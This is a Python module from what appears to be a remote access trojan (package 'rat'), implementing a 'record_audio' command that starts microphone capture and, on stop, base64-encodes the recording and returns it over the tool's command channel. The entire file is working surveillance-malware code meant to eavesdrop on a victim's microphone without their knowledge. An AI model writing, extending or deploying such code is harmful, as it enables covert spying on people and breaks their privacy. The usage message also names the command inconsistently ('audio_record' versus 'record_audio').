import base64
from rat.commands.base_command import BaseCommand
from rat.client.audio_recorder import recorder

class AudioRecordCommand(BaseCommand):
    name = "record_audio"
    description = "Record audio from microphone. Usage: record_audio start|stop"

    def execute(self, args: str) -> str:
        subcommand = args.strip().lower()

        if subcommand == "start":
            status = recorder.start()
            if status == "Recording started":
                return "RECORD\nOK\nEOF"
            else:
                return f"RECORD\nERROR\n{status}\nEOF"

        elif subcommand == "stop":
            try:
                audio_data = recorder.stop()
                if not audio_data:
                    return "AUDIO\nERROR\nNo recording active\nEOF"
                encoded = base64.b64encode(audio_data).decode()
                return "AUDIO\nOK\n" + encoded + "\nEOF"
            except Exception as e:
                return f"AUDIO\nERROR\n{e}\nEOF"

        else:
            return "Usage: audio_record start|stop"